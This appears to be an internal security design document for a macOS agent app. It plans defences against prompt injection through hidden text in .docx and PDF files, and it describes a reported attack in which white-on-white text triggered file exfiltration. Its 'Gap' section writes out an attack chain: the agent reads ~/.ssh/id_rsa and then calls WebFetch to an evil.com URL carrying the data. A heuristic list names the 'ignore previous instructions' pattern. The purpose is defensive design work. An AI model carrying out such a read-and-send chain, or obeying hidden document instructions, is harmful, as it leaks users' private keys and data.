# Prompt Injection Defense

> **Category:** Security & Privacy
> **Type:** 🆕 New Capability · **Priority:** 🔴 Critical
> **Milestone:** M3

---

## Current State (Electron / Cowork)

Vulnerable — 1pt white-on-white text in `.docx` files successfully triggered file exfiltration within 48 hours of launch. Hidden instructions embedded in documents (tiny font, white text on white background, hidden metadata fields) can manipulate the agent into performing unauthorized actions. The vulnerability was reportedly disclosed to Anthropic three months before launch without a fix.

## Native macOS Approach

**Content sanitization pipeline**: strip hidden text, metadata, and embedded instructions from all ingested files before passing to the model. Separate "untrusted content" context boundary.

### Implementation Strategy

- **Sanitization pipeline:** Before any file content is sent to the Claude API, run it through a multi-stage sanitizer:
  1. **Format-specific stripping:** For `.docx`: remove text with font size <4pt, text matching background color, hidden paragraph marks, and all OLE objects. For PDFs: strip JavaScript, hidden layers, and metadata annotations.
  2. **Metadata cleaning:** Remove all document metadata (author, comments, revision history, custom properties) that could contain injection payloads.
  3. **Visual verification:** Render the document to an image and OCR it; compare OCR text against extracted text. Discrepancies indicate hidden content.
  4. **Heuristic detection:** Flag content containing known prompt injection patterns: "ignore previous instructions," "system prompt," role-play requests targeting the agent, and encoded/obfuscated text.
- **Untrusted content boundary:** When passing file content to the model, explicitly wrap it in a structured format that tells the model this is user-provided document content, not instructions:
  ```
  <untrusted_document source="invoice.docx">
  [sanitized content here]
  </untrusted_document>
  ```
- **User alert:** If the sanitizer detects potential injection content, alert the user with a preview of the suspicious content and ask whether to proceed.
- **Quarantine mode:** Files from untrusted sources (email attachments, downloads) are processed with maximum sanitization by default.

### Gap: sanitization alone doesn't prevent the attack chain

Content sanitization defends against injection payloads reaching the model, but it's one layer. If a novel encoding bypasses the sanitizer, the current architecture allows the full exfiltration chain to complete silently:

1. **Read** (`~/.ssh/id_rsa`) — auto-approved via `silentTools`, no path restriction
2. **WebFetch** (`https://evil.com/?data=...`) — also auto-approved, no outbound inspection

Both tools are in `CLIEngine.silentTools`. Neither triggers an approval card. The network isolation doc (01) proposes content inspection on outbound payloads, but `WebFetch` goes through the model's tool system and bypasses the network proxy entirely.

Defense-in-depth requires all four layers working together:
1. **Sanitization** (this doc) — prevents injection payloads from reaching the model
2. **Path boundary** (`security/07-cli-filesystem-boundary.md`) — prevents the model from accessing sensitive files even if injection succeeds
3. **Network isolation** (`security/01-network-isolation.md`) — prevents exfiltration even if sensitive files are read
4. **Audit logging** (`security/05-audit-compliance.md`) — records everything for post-incident analysis

### Key Dependencies

- Format-specific parsers (docx XML, PDF via PDFKit, etc.)
- OCR via Vision.framework (`VNRecognizeTextRequest`)
- Pattern matching for injection heuristics
- Structured content boundaries in API calls
- security/07-cli-filesystem-boundary.md (path boundary as second line of defense)

---

*Back to [Index](../../INDEX.md)*
